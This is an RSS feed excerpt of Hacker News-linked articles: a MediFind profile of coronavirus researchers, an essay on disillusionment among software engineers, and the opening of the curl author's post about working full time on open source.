						<video playsinline="" autoplay="" preload="metadata" muted="" loop="" poster="https://www.testim.io/wp-content/uploads/2020/10/new-pic2.png">
							<source src="https://www.testim.io/wp-content/uploads/2020/10/root-cause-local_new.mp4" type="video/mp4">
							Your browser does not support the video tag.
						</video>
					</p>
				</div>
											</div>
		</div>
	</section>
		
		<section>
		<div>
						<h2>Why Testim?</h2>
									<p>Testim has been building AI-based test automation solutions that help organizations like Microsoft, JFrog, and SalesForce quickly author stable E2E tests. We use, integrate with, and learn from test automation frameworks like Selenium, Puppeteer, Playwright, and Cypress. Our mission is to make software quality easy, whether on our platform or yours.</p>
						
		</div>
	</section>
	</main>

	</div>
	
	</div></div>]]>
            </description>
            <link>https://www.testim.io/root-cause/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24897260</guid>
            <pubDate>Mon, 26 Oct 2020 15:32:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beyond Fauci: Meet the Science Superheroes Leading the U.S. Covid-19 Response]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24896808">thread link</a>) | @KaiserSanchez
<br/>
October 26, 2020 | https://www.medifind.com/news/post/beyond-fauci-meet-the-science-superheroes-leading-the-us-covid-19-response | <a href="https://web.archive.org/web/*/https://www.medifind.com/news/post/beyond-fauci-meet-the-science-superheroes-leading-the-us-covid-19-response">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><div>
<p>The COVID-19 pandemic has been a world-changing event, forcing all of us to spend a lot of time thinking about change. More than ever, we’re inquiring about how diseases evolve, how new treatments and procedures are developed and adopted, and how up-and-coming experts are bringing new ideas and new ways of thinking to the medical landscape. We know that 2020 has brought a lot of new changes and concepts to the forefront of life. Words like quarantine and social distancing are part of our everyday lexicon as we learn to live in the ‘new normal.’ And one of the most important lessons we have learned is that there are heroes among us. From teachers and nurses to delivery and retail workers, our citizens have stepped up to support the effort.</p>



<p>Given that it’s <a href="https://idweek.org/" target="_blank" rel="noreferrer noopener">ID Week</a>, we’d like to highlight and honor a few of these heroes that surprisingly few know about – the scientists who are leading the charge against <a rel="noreferrer noopener" href="https://www.medifind.com/conditions/covid-19/6278" target="_blank">COVID-19</a>.</p>







<hr>







<h2><strong>Ralph Steven Baric, PhD</strong></h2>



<h4><em>The Baric Laboratory at UNC in Chapel Hill, NC</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/15233834/01_Dr-Ralph-Steven-Baric-PhD.png" alt="Dr Ralph Steven Baric PhD"></figure>



<p>Dr. Baric has been at the forefront of coronavirus research for over 30 years, and is currently the William R. Kenan, Jr. Distinguished Professor in the Department of Epidemiology and Professor in the Department of Microbiology and Immunology at UNC-Chapel Hill. His passion for this previously obscure virus stems from his concern about the coronavirus’ ability to rapidly spread and its ability to jump across species. The global dangers present in coronavirus strains were an early warning sign to Dr. Baric, causing him to sound prophetic alarms before the events of late 2019 unfolded. Back in 2002, he predicted the <a href="https://www.medifind.com/conditions/severe-acute-respiratory-syndrome/4799" target="_blank" rel="noreferrer noopener">severe acute respiratory syndrome (SARS) </a>outbreak and in 2018, he was already discussing the potential for our current pandemic originating from bats.&nbsp;</p>



<p>Dr. Baric is currently developing antiviral treatments for patients and researching how the virus is replicating and spreading.</p>



<figure><p>
<iframe title="Imagining the Next Flu Pandemic – and Preventing it!" width="500" height="375" src="https://www.youtube.com/embed/UuERPvBFfco?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Follow Baric Lab’s progress on Twitter: <a rel="noreferrer noopener" href="https://twitter.com/baric_lab?lang=en" target="_blank">@Baric_Lab</a></p>







<hr>







<h2><strong>Timothy Sheahan, PhD</strong><strong></strong></h2>



<h4><em>The Baric Laboratory at UNC in Chapel Hill, NC</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/15233835/01_Dr-Timothy-Sheahan-PhD-e1602873217271.png" alt="Dr Timothy Sheahan PhD"></figure>



<blockquote><p>“With the development of broad-spectrum antiviral strategies, we are not only working to address SARS-CoV-2 and COVID-19 but also those in the future…COVID-28!”</p><cite>– Timothy Sheahan, PhD</cite></blockquote>



<p>Dr. Sheahan is an assistant professor in the Department of Epidemiology at the University of North Carolina at Chapel Hill’s Gillings School of Global Public Health.&nbsp; He is currently working on better understanding how viruses jump to humans, developing new models to study how emerging viruses cause disease and identifying drugs, antibodies and vaccines for the emerging viruses.</p>



<figure><p>
<iframe title="Coronavirus Investigated: Antivirals" width="500" height="281" src="https://www.youtube.com/embed/3220i1GUO3c?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Follow Baric Lab’s progress on Twitter: <a href="https://twitter.com/baric_lab?lang=en" target="_blank" rel="noreferrer noopener">@Baric_Lab</a></p>







<hr>







<h2><strong>Linda Saif, PhD</strong></h2>



<h4><em>The Saif Laboratory at Ohio State University in Wooster, OH</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/15233836/03_Dr-Linda-Saif-PhD-e1602873174733.png" alt="Dr Linda Saif PhD"></figure>



<blockquote><p>“The real unsung Superheroes of the COVID-19 pandemic are the frontline health care workers and first responders, some of whom have given their own lives in trying to save the lives of COVID-19 patients. We owe them our deepest and enduring gratitude.&nbsp;Masks on to them!”</p><cite>– Dr. Linda Saif PhD</cite></blockquote>



<p>Dr. Saif is the distinguished university professor at The Ohio State University (OSU) in the Food Animal Health Research Program (CFAES, OARDC) and the Veterinary Preventive Medicine Department (CVM, OSU).&nbsp; She has been researching coronaviruses, immunity and vaccines for over 40 years and is recognized internationally as an expert on enteric viruses (rotaviruses, caliciviruses and coronaviruses) that affect food-producing animals, wildlife, and humans.&nbsp;</p>



<p>In 1995, Dr. Saif’s lab was the first to document the interspecies transmission of coronaviruses from wild ruminants to cattle and from cattle to poultry. Dr. Saif holds 5 US/foreign patents and has authored or coauthored over 390 journal publications and 77 book chapters.</p>



<figure><p>
<iframe title="Global One Health webinar with Dr. Linda Saif" width="500" height="281" src="https://www.youtube.com/embed/uiwcohzpMtw?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Follow her progress <a rel="noreferrer noopener" href="https://viroimmunelab.osu.edu/home" target="_blank">here</a>.</p>







<hr>







<h2><strong>Vincent Jacobus Munster, PhD</strong></h2>



<h4><em>Rocky Mountain Laboratories at NIH in Hamilton, MT</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/15233837/04_Dr-Vincent-Jacobus-Munster-PhD-e1602873193983.png" alt="Dr Vincent Jacobus Munster PhD"></figure>



<p>Dr. Munster is the Senior Investigator for the Virus Ecology Unit of The National Institute of Allergy and Infectious Diseases (NIAID). Dr. Munster established the Virus Ecology Unit in 2013 with the intention of combining field-acquired data and experimental lab work in a unilateral approach to identify the underlying changes in virus-host ecology that allow emerging viral pathogens to cross the species barrier. His lab leverages the data collected from Africa (the Republic of the Congo, Mali), the Caribbean (Trinidad and Tobago), and the Middle East (Jordan) and partners it with state-of-the-art high and maximum containment facilities to best leverage and investigate the data. His recent work produced much of our current understanding on the transmission and surface persistence of coronavirus.</p>



<p>Currently Dr. Munster is conducting pre-human research on the Oxford SARS-CoV-2 vaccine.</p>



<figure><p>
<iframe title="How Long Can the SARS-CoV-2 Virus Live on Surfaces and in Aerosols?" width="500" height="281" src="https://www.youtube.com/embed/TugWC8XKlp8?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Follow his progress <a href="https://irp.nih.gov/pi/vincent-munster" target="_blank" rel="noreferrer noopener">here</a>. </p>







<hr>







<h2><strong>Stanley Perlman, MD, PhD</strong></h2>



<h4><em>The Perlman Laboratory at University of Iowa in Iowa City, IA</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/15233839/05_Dr-Stanley-Perlman-MD-PhD-e1602873227152.png" alt="Dr Stanley Perlman MD PhD"></figure>



<p>Dr. Perlman is a professor of microbiology and immunology, professor of pediatrics and the Mark Stinski Chair in Virology at the University of Iowa. For over 35 years he has been studying coronaviruses and has been interested in the pathogenesis of murine (mouse) coronavirus infections. He and his lab have developed reverse genetics system for introducing mutations into the murine coronavirus, SARS-CoV, SARS-CoV-2, and MERS-CoV genomes with the ultimate goal of to understanding the interplay of pro- and anti-inflammatory factors that result in myelin and lung destruction. He often is looked to for insights into the overall landscape and impact of coronavirus epidemics and responses.</p>



<p>Currently Dr. Perlman is conducting research using mice infected with murine-adapted strains of SARS-CoV and SARS-CoV-2 to understand the basis of these severe diseases.</p>



<figure><p>
<iframe title="COVID-19 Symposium: The SARS-CoV-2 Pandemic | Dr. Stanley Perlman" width="500" height="281" src="https://www.youtube.com/embed/4vmGTfg_v8g?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Follow his progress <a href="https://perlman.lab.uiowa.edu/" target="_blank" rel="noreferrer noopener">here</a>.</p>







<hr>







<h2><strong>James Earl Crowe Jr., MD</strong></h2>



<h4><em>The Crowe Laboratory at Vanderbilt University in Nashville, TN</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/15233840/06_Dr-James-Earl-Crowe-PhD-e1602873237912.png" alt="Dr James Earl Crowe PhD"></figure>



<blockquote><p>“Our team of human immunology and antibody engineering experts is passionate about bringing advances in antibody therapeutics to bear on the world burden of infectious diseases.”</p><cite>– Dr. James Earl Crowe Jr. MD</cite></blockquote>



<p>Dr. Crowe is the Director of the Vanderbilt Vaccine Center, Professor of Pediatrics and Pathology, Microbiology and Immunology and the Ann Scott Carell Chair at Vanderbilt University Medical Center.&nbsp; Additionally, He is the Founder of IDBiologics, Inc., an early stage biotech company developing human monoclonal antibodies for infectious diseases.&nbsp; His work focuses on viral immunology and antibody sciences, attempting to discover mechanisms of immunity important to developing new therapeutics and vaccines.</p>



<p>Currently Dr. Crowe is conducting research for vaccine and monoclonal antibody development, and biotechnology for COVID-19.</p>



<figure><p>
<iframe title="Unraveling the Mystery of Immunity | Dr. James Crowe, Jr. | TEDxNashville" width="500" height="281" src="https://www.youtube.com/embed/YfuS3__1a-k?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Follow his lab’s progress on Twitter: <a href="https://twitter.com/vumc_vaccines?lang=en" target="_blank" rel="noreferrer noopener">@VUMC_Vaccines</a></p>







<hr>







<h2><strong>Susan Weiss, PhD</strong><strong></strong></h2>



<h4><em>The Weiss Laboratory at Perelman School of Medicine at the University of Pennsylvania in Philadelphia, PA</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/16135917/Dr-Susan-Weiss-PhD.png" alt="Dr Susan Weiss PhD" srcset="https://cdn.medifind.com/wp/2020/10/16135917/Dr-Susan-Weiss-PhD.png 200w, https://cdn.medifind.com/wp/2020/10/16135917/Dr-Susan-Weiss-PhD-150x150.png 150w, https://cdn.medifind.com/wp/2020/10/16135917/Dr-Susan-Weiss-PhD-120x120.png 120w" sizes="(max-width: 200px) 100vw, 200px"></figure>



<p>Dr. Weiss is a Professor and Vice Chair for the Department of Microbiology and Co-Director, Penn Center for Research on Coronaviruses and Other Emerging Pathogens. She has been focusing on coronaviruses since the 1980’s, primarily exploring the emerging pathogens that cause <a href="https://www.medifind.com/conditions/severe-acute-respiratory-syndrome/4799" target="_blank" rel="noreferrer noopener">severe acute respiratory syndrome (SARS)</a>, <a href="https://www.medifind.com/conditions/middle-east-respiratory-syndrome/6295" target="_blank" rel="noreferrer noopener">Middle East respiratory syndrome (MERS)</a>, as well as human coronavirus OC43 and human coronavirus 229E.&nbsp;</p>



<p>Currently Dr. Weiss is conducting research utilizing reverse genetics helps to understand the spread of coronaviruses.</p>



<figure><p>
<iframe title="Susan R. Weiss - Coronavirus biology: features common to all coronaviruses" width="500" height="281" src="https://www.youtube.com/embed/gr8o25fTAiQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Follow her progress on Twitter: <a href="https://twitter.com/penncov?lang=en" target="_blank" rel="noreferrer noopener">@PENNCoV</a></p>







<hr>







<h2><strong>Jennifer Nuzzo, DrPH, SM</strong><strong></strong></h2>



<h4><em>Bloomberg School of Public Health at Johns Hopkins University in Baltimore, MD</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/15233842/08_Jennifer-Nuzzo-DrPH-SM-e1602873248440.png" alt="Jennifer Nuzzo DrPH SM"></figure>



<p>Dr. Nuzzo is a Senior Scholar at the Johns Hopkins Center for Health Security and an Associate Professor in the Department of Environmental Health and Engineering and the Department of Epidemiology at the Johns Hopkins Bloomberg School of Public Health.&nbsp; She focuses on outbreak detection and response, health systems as they relate to global health security, international and domestic biosurveillance, and infectious disease diagnostics.</p>



<p>Currently, Dr. Nuzzo is working on the U.S. response to COVID-19.</p>







<p>Follow her progress on Twitter: <a href="https://twitter.com/JenniferNuzzo" target="_blank" rel="noreferrer noopener">@JenniferNuzzo</a></p>







<hr>







<h2><strong>Dimiter Stanchev Dimitrov, PhD</strong><strong></strong></h2>



<h4><em>Center for Antibody Therapeutics (CAT) at University of Pittsburgh School of Medicine in Pittsburgh, PA</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/15233843/09_Dr-Dimiter-Stanchev-Dimitrov-PhD-e1602873255347.png" alt="Dr Dimiter Stanchev Dimitrov PhD"></figure>



<p>Dr. Dimitrov is senior author of the Cell publication and director of Pitt’s Center for Antibody Therapeutics, was one of the first to discover neutralizing antibodies for the original SARS coronavirus in 2003. In the ensuing years, his team discovered potent antibodies against many other infectious diseases, including those caused by MERS-CoV, dengue, Hendra and Nipah viruses. The antibody against Hendra and Nipah viruses has been evaluated in humans and approved for clinical use on a compassionate basis in Australia.</p>



<p>Recently Dr. Dimitrov’s lab isolated the smallest biological molecule to date that completely and specifically neutralizes the SARS-CoV-2 virus, which is the cause of COVID-19.</p>







<p>Follow the lab’s progress <a rel="noreferrer noopener" href="http://dom.pitt.edu/id/research/btresearch/catlab/" target="_blank">here</a>.</p>







<hr>







<h2><strong>Florian Krammer, PhD</strong><strong></strong></h2>



<h4><em>The Krammer Laboratory at the Icahn School of Medicine at Mount Sinai in New York, NY</em></h4>



<figure><img src="https://cdn.medifind.com/wp/2020/10/16143747/Krammer-profile-small-scaled-e1602873518345-150x150.jpg" alt="" width="200" height="200"></figure>



<p>Dr. Krammer is a Professor of Vaccinology at the Department of Microbiology at the Icahn School of Medicine at Mount Sinai and a member of the Vaccine and Edward Jenner Society Young Investigator Program. In addition, he is a scientific adviser for enGenes and PathSensors.&nbsp; The Krammer Laboratory – which is also part of the NIH-funded Centers for Excellence in Influenza Research and Surveillance (CEIRS) – focuses on understanding broadly-reactive immune responses against the surface glycoproteins of RNA viruses such as influenza, with the goal to …</p></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.medifind.com/news/post/beyond-fauci-meet-the-science-superheroes-leading-the-us-covid-19-response">https://www.medifind.com/news/post/beyond-fauci-meet-the-science-superheroes-leading-the-us-covid-19-response</a></em></p>]]>
            </description>
            <link>https://www.medifind.com/news/post/beyond-fauci-meet-the-science-superheroes-leading-the-us-covid-19-response</link>
            <guid isPermaLink="false">hacker-news-small-sites-24896808</guid>
            <pubDate>Mon, 26 Oct 2020 14:55:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Surviving Disillusionment]]>
            </title>
            <description>
<![CDATA[
Score 303 | Comments 167 (<a href="https://news.ycombinator.com/item?id=24896650">thread link</a>) | @mwcampbell
<br/>
October 26, 2020 | https://www.spakhm.com/p/surviving-disillusionment | <a href="https://web.archive.org/web/*/https://www.spakhm.com/p/surviving-disillusionment">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the past few weeks I wrote about <a href="https://www.spakhm.com/p/how-to-get-promoted">corporate politics</a>, <a href="https://www.spakhm.com/p/parallel-tracks">distribution of power</a>, and <a href="https://www.spakhm.com/p/an-open-letter-to-my-friends-with">disregard for ethics</a>. Dozens of people reached out to say the posts were dark, cynical and depressingly accurate. There are more dark posts I can write— about lies in venture capital, the devastating price of failure, the destructive aspect of creative relationships, the ubiquity of envy. But I think I've gotten my point across. The industry can be depressing. I now want to concentrate on a different question: what to do with this knowledge.</p><p>The word "possession" means owning things, but it also means things owning you. Knowledge can possess people. Once you observe the darker side of human nature in the technology industry, you cannot forget or unsee it. The subsequent cynicism can be so disheartening that the romance of the computer revolution is beat out of people completely.</p><p>I've met many engineers with extraordinary talent who decided to stop making software. They wanted to program computers all their lives. They were born for it. After spending six, eight, ten years in the industry, they quit for good. Now they're running breweries and hydroponic farms, with no desire to ever again touch a compiler, let alone get back into the fray.</p><p>There is nothing wrong with brewing beer or growing hydroponic tomatoes. What's sad is that people weren't pulled into their new occupation by better financial opportunities or conviction; instead they were pushed away from technology. If brewing paid as much as programming, it still wouldn't have been their first choice. Something had to have gone wrong for them to abandon their first love.</p><p>In <a href="https://amzn.to/35ATS95">Zen Mind, Beginner's Mind</a>, Shunryu Suzuki says:</p><blockquote><p>For us, the monastic life was the usual life, and the people who came from the city were unusual people. When we saw them we felt, “Oh, some unusual people have come!” But once I had left Eiheiji and been away for some time, coming back was different. I heard the various sounds of practice—the bells and the monks reciting the sutra—and I had a deep feeling. There were tears flowing out of my eyes, nose, and mouth! It is the people who are outside of the monastery who feel its atmosphere. Those who are practicing actually do not feel anything. I think this is true for everything.</p></blockquote><p>I still remember the feeling when I first glanced inside the monastery. My parents bought me a ZX Spectrum computer connected to an old Soviet TV and cassette player, a few bootleg games, and a Z80 assembly manual printed on a dot matrix printer that was out of ink; about one tenth of the text was unreadable. I spent countless hours playing games, learning BASIC and Z80 assembly, and deciphering the missing parts of the manual. I don't remember much else from that time. That little machine was a window into a different world— limitless, safe, and totally engaging. At the time, nothing else mattered.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg&quot;,&quot;height&quot;:1008,&quot;width&quot;:1456,&quot;resizeWidth&quot;:656,&quot;bytes&quot;:206242,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>My next computer was an IBM machine with an i386 processor, 2MB of RAM (the ZX Spectrum had 16KB), a 30MB hard disk, and a five inch floppy drive. I could load programs in seconds instead of minutes. I could run Dune 2 and Wolfenstein 3D and hex editors and Prince of Persia and MS DOS and Borland Turbo Pascal and Civilization and a C compiler and Windows 3.1. I could save stuff! I remember studying Win16 APIs and feeling like I made contact with an advanced alien civilization. As I type this now, I still have sense memory of that machine. The rubbery smell, the buzzing sound of the CRT monitor, the springy feel of the keyboard (with proper arrow keys and all sorts of extra buttons!)</p><p>Then my friend's parents bought him an i486 machine with 4MB of RAM. It could run Doom. Everything changed again. You didn't even need to play to know that computer history was just delineated into before and after. As soon as you saw the artwork of the game menu, you knew. Doom changed me in a profound way. I used to never think about computers or programming. It was just something I loved to do more than anything else. But a few seconds of Doom gameplay permanently flipped a bit in my brain. It made me aware that programming computers is what I want to be doing for the rest of my life.</p><p>After that came the internet, and with it a whirlwind of new worlds. Some were brand new. Others were old, but the internet gave me the opportunity to access them for the first time. Windows 95, newsgroups, geocities, ICQ, Visual Studio, Diablo, Starcraft, 3Dfx Voodoo Banshee, Gamedev.net, IRC, Slashdot, DirectX, Windows NT, Java, OpenGL, NewEgg, Winamp, Napster, Deus Ex, World of Warcraft, Linux, Emacs, GPL, Google, Common Lisp, Standard ML, Smalltalk, the iPhone, Oculus Rift. Each had its own unique atmosphere. Each was a window into a different universe. Each one felt limitless. Safe. Engaging.</p><p>Everything, from the first ZX Spectrum to Oculus Rift was punctuated by countless books of science fiction. My dad introduced me to the genre with Jules Verne's The Mysterious Island, in which a team of five end up on an uninhabited island, and use their knowledge and ingenuity to rebuild a technological civilization from scratch. I remember reading this novel over and over, completely enthralled. I tried some of the experiments, with intermittent success.</p><p>My parents had a few shelves stacked with books, and I spent countless nights losing myself in them. I read everything by Jules Verne I could get my hands on, including From the Earth to the Moon, Twenty Thousand Leagues Under the Sea, Around the World in Eighty Days, and Journey to the Center of the Earth. After Verne I moved on to Ray Bradbury (The Veldt), Arkadiy and Boris Strugatsky (Prisoners of Power), Stanislaw Lem (the fantastical Summa Technologiae). I also read every story we had by Jack London— I couldn't imagine anything more exciting than the combination of science fiction and the romance of the American frontier. Today, nearly thirty years later, I still can't.</p><p>After we moved to America I learned that there is an enormous universe of science fiction that I missed as a child. I started filling the gaps and read stories and novels by Isaac Asimov, Arthur Clarke, William Gibson, Neal Stephenson, Ian Banks, Philip Dick, Cory Doctorow, Charlie Stross, Dan Simmons, Jack Vance, and Vernor Vinge. I also continued reading Russian science fiction. I read everything by Strugatsky brothers, and binge-read the pulpy Russian spin on the cyberpunk genre by Sergei Lukyanenko.</p><p>As I grew older I shifted to reading about megaprojects and the intersection of technology and commerce. I read about railroads, electrification, aviation, radio, television, silicon, and the stories of Bell Labs, Microsoft, The Manhattan Project, and The Apollo program. How the heck did we invent all this stuff, wire the planet, speed up transportation by two orders of magnitude, go to space, put a computer on every desk, and then, as if it weren't enough, put a supercomputer in every pocket?! How did we do all <em>that</em>?!</p><p>Sometimes I imagine what would happen if I could send my ten year old self a letter and tell him I could press a button and read <a href="https://amzn.to/2TrADJK">Masters of Doom</a> the next day, instantly send a short message to John Carmack from <em>anywhere</em> using an always connected supercomputer in my pocket, or that I worked for a company that published <a href="https://amzn.to/2HsSXQm">The Making of Prince of Persia</a>. He would have been over the moon!</p><p>But sitting at a mandated retrospective or mindlessly gluing APIs together doesn't put me over the moon. It makes me feel the opposite (whatever the opposite of being over the moon is). And so, engineers are faced with two realities. One reality is the atmosphere of new technology, its incredible power to transform the human condition, the joy of the art of doing science and engineering, the trials of the creative process, the romance of the frontier. The other reality is the frustration and drudgery of operating in a world of corporate politics, bureaucracy, envy and greed— a world <em>so</em> depressing, that many people quit in frustration, never to come back.</p><p>If you work in technology, the monastery can be distant and vague, whereas Paul from marketing wants to circle back with you here and now. Then, as you circle back again and again, the monastery recedes further into the distance, and the drudgery appears closer and closer, until it occupies your entire field of vision and you can't see anything else.</p><p>I have friends in the medical field, and they vent about drudgery and endless bureaucracy <em>all the time</em>. They have more roadblocks than we do, and theirs are objectively worse than ours. The hours are longer, the bureaucracy is more entrenched, the regulators mandate their time be wasted on bullshit, and mistakes can have devastating consequences. Yet I haven't heard of a single doctor who quit his practice and moved to Colorado to run a ski lodge. When I ask why, they all give the same response: the patients. Every day they see patients brought back to health, the bullshit recedes into the background, and they're reminded why they got into medicine.</p><p>The default in engineering is different. We don't have a daily ritual built into our jobs that reminds us why we got into the field. Without a ritual, the drudgery creeps closer and the vision of the monastery recedes. So we must be very deliberate in developing rituals to keep the two realities in their proper proportion.</p><p>I think the reason many engineers have trouble with this is that so much of our field is about knowledge, but rituals aren't about knowledge at all— they're about practice. You must develop a daily mantra, a spell, a routine, whatever you want to call it, and then perform it religiously. I needed a lot of trial and error to get it right, and I’m still playing with the details. The internet desensitized me to text and video. Anything that happens in front of a screen doesn't help with perspective anymore. But I discovered that getting away from the screen and handling physical items does.</p><p>I don't know what will work for you, but here are a few ideas. Read used hard cover …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spakhm.com/p/surviving-disillusionment">https://www.spakhm.com/p/surviving-disillusionment</a></em></p>]]>
            </description>
            <link>https://www.spakhm.com/p/surviving-disillusionment</link>
            <guid isPermaLink="false">hacker-news-small-sites-24896650</guid>
            <pubDate>Mon, 26 Oct 2020 14:42:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Working Open Source]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24896608">thread link</a>) | @TangerineDream
<br/>
October 26, 2020 | https://daniel.haxx.se/blog/2020/10/26/working-open-source/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/10/26/working-open-source/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I work full time on open source and this is how.</p>



<h2>Background</h2>



<p>I started learning how to program in my teens, well over thirty years ago and I’ve worked as a software engineer and developer since the early 1990s. My first employment as a developer was in 1993. I’ve since worked for and with lots of companies and I’ve worked on a huge amount of (proprietary) software products and devices over many years. Meaning: I certainly didn’t start my life open source. I had to earn it.</p>



<p>When I was 20 years old I did my (then mandatory) military service in Sweden. After having endured that, I applied to the university while at the same time I was offered a job at IBM. I hesitated, but took the job. I figured I could always go to university later – but life took other turns and I never did. I didn’t do a single day of university. I haven’t regretted it.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/10/commodore64.jpg" alt="" width="229" height="119"></figure></div>



<p>I learned to code in the mid 80s on a Commodore 64 and software development has been one of my primary hobbies ever since. One thing it taught me well, that I still carry with me, is to spend a few hours per day in front of my home computer.</p>



<h2>And then I shipped curl</h2>



<p>In the spring of 1998 I renamed my little pet project of the time again and I released the first ever <a href="https://curl.haxx.se/">curl</a> release. I have told this story many times, but since then I have spent two hours or so of my spare time on that project – <em>every day for over twenty years</em>. While still working as a software engineer by day.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="214" height="187" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 214px) 100vw, 214px"></figure></div>



<p>Over time, curl gradually grew popular and attracted more users. There was no sudden moment in time where I struck gold and everything took off. It was just slowly gaining ground while me and my fellow project members kept improving and polishing curl. At some point in time I happened to notice that curl and libcurl would appear in more and more acknowledgements and in open source license collections in products and devices.</p>



<p>It was still just a spare time project.</p>



<h2>Proprietary Software for years</h2>



<p>I’d like to emphasize that I worked as a contract and consultant developer for many years (over 20!), primarily on proprietary software and custom solutions, before I managed to land myself a position where I could primarily write open source as part of my job.</p>



<h2>Mozilla</h2>



<p>In 2014 I <a href="https://daniel.haxx.se/blog/2014/01/13/this-is-my-first-day-at-mozilla/" data-type="post" data-id="5377">joined Mozilla</a> and got the opportunity to work on the open source project Firefox for a living – and doing it entirely from my home. This was the first time in my career I actually spent most of my days on code that was made public and available to the world. They even allowed me to spend a part of my work hours on curl, even if that didn’t really help them and curl was not a fundamental part of any Mozilla work or products. It was still great.</p>



<p>I landed that job for Mozilla a lot thanks to my many years and long experience with portable network coding and running a successful open source project at this level.</p>



<p>My work setup with Mozilla made it possible for me to spend even more time on curl, apart from the (still going) two daily spare time hours. Nobody at Mozilla cared much about (my work with) curl and no one there even asked me about it. I worked on Firefox for a living.</p>



<p>For anyone wanting to do open source as part of their work, getting a job at a company that already does a lot of open source is probably the best path forward. Even if that might not be easy either, and it might also mean that you would have to accept working on some open source projects that you might not yourself be completely sold on.</p>



<p>In late 2018 I quit Mozilla, in part because I wanted to try to work with curl “for real” (and part other reasons that I’ll leave out here). curl was then already over twenty years old and was used more than ever before.</p>



<h2>wolfSSL</h2>



<p>I now <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">work for wolfSSL</a>. We sell curl support and related services to companies. Companies pay <a href="https://wolfssl.com/">wolfSSL</a>, wolfSSL pays me a salary and I get food on the table. This works as long as we can convince enough companies that this is a good idea.</p>



<p>The vast majority of curl users out there of course don’t pay anything and will never pay anything. We just need a small number of companies to do it – and it seems to be working. We help customers use curl better, we make curl better for them and we make them ship better products this way. It’s a win win. And I can work on open source all day long thanks to this.</p>



<h2>My open source life-style</h2>



<p>A normal day in the work week, I get up before 7 in the morning and I have breakfast with my family members: my wife and my two kids. Then I grab my first cup of coffee for the day and take the thirteen steps up the stairs to my “office”.</p>



<p>I sit down in front of my main development (Linux) machine with two 27″ screens and get to work.</p>



